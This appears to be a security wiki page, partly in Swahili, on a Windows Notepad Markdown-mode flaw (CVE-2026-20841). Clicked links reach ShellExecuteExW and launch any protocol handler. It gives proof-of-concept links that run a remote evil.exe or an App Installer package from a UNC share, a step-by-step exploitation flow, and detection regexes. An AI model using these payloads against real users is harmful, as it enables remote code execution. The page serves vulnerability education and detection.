# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Programu za kisasa za Windows zinazotafsiri Markdown/HTML mara nyingi hubadilisha viungo vilivyoingizwa na mtumiaji kuwa vipengele vinavyoweza kubofyanwa na kuvituma kwenye `ShellExecuteExW`. Bila orodha ya ruhusa ya schemes yenye ukali, protocol handler yoyote iliyosajiliwa (mfano, `file:`, `ms-appinstaller:`) inaweza kuanzishwa, ikisababisha utekelezaji wa code katika muktadha wa mtumiaji wa sasa.

## ShellExecuteExW surface in Windows Notepad Markdown mode
- Notepad huchagua Markdown mode **tu kwa `.md` extensions** kupitia kulinganisha kamba ya fasta katika `sub_1400ED5D0()`.
- Supported Markdown links:
- Standard: `[text](target)`
- Autolink: `<target>` (huonyeshwa kama `[target](target)`), hivyo miundo yote miwili ni muhimu kwa payloads na utambuzi.
- Link clicks are processed in `sub_140170F60()`, ambayo hufanya uchujaji dhaifu kisha inaita `ShellExecuteExW`.
- `ShellExecuteExW` dispatches to **any configured protocol handler**, not just HTTP(S).

### Payload considerations
- Any `\\` sequences in the link are **normalized to `\`** before `ShellExecuteExW`, ikioathiri UNC/path crafting na utambuzi.
- `.md` files are **not associated with Notepad by default**; waathiriwa bado lazima afungue faili katika Notepad na kubofya kiungo, lakini mara inapoonyeshwa, kiungo kinaweza kubofyanwa.
- Dangerous example schemes:
- `file://` to launch a local/UNC payload.
- `ms-appinstaller://` to trigger App Installer flows. Schemes nyingine zilizojisajili ndani pia zinaweza kutumika vibaya.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Exploitation flow
1. Craft a **`.md` file** so Notepad renders it as Markdown.
2. Embed a link using a dangerous URI scheme (`file:`, `ms-appinstaller:`, or any installed handler).
3. Deliver the file (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB or similar) and convince the user to open it in Notepad.
4. On click, the **kiungo kilichosawazishwa** is handed to `ShellExecuteExW` and the corresponding protocol handler executes the referenced content in the user’s context.

## Mawazo ya kugundua
- Fuatilia uhamisho wa faili za `.md` kupitia bandari/itifaki ambazo kawaida husambaza nyaraka: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Changanua viungo vya Markdown (standard na autolink) na tafuta `file:` au `ms-appinstaller:` bila kuzingatia herufi kubwa/ndogo.
- Regex zinazoongozwa na vendor ili kugundua ufikiaji wa rasilimali za mbali:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Tabia ya patch iliripotiwa **inaoruhusu faili za ndani na HTTP(S)**; chochote kingine kinachofikia `ShellExecuteExW` ni cha kutiliwa shaka. Panua utambuzi kwa protocol handlers nyingine zilizosanikishwa inapohitajika, kwani attack surface inatofautiana kulingana na mfumo.

## Marejeo
- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
